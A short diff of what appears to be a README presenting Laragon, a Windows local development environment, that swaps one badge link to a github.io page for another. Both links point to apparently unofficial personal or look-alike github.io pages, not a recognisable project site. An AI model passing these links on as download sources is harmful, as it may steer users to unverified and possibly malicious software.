@@ -9,7 +9,7 @@
 
 Laragon is an enterprise-grade local development environment optimized for the Windows platform. It serves as a fast, lightweight, and isolated workspace for managing web stacks including PHP, MySQL, Apache, Nginx, and Node.js. By utilizing a completely portable directory structure and automated virtual host configuration, the software removes environment setup friction from backend development workflows.
 
-[![Download Laragon](https://img.shields.io/badge/Download-Laragon-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://sarahbakerl764.github.io/.github/Laragon-Development-Node)
+[![Develop with Laragon](https://img.shields.io/badge/Develop%20with-Laragon-2563EB?style=flat-square)](https://laragon-development.github.io/.github/)
 
 ---
 
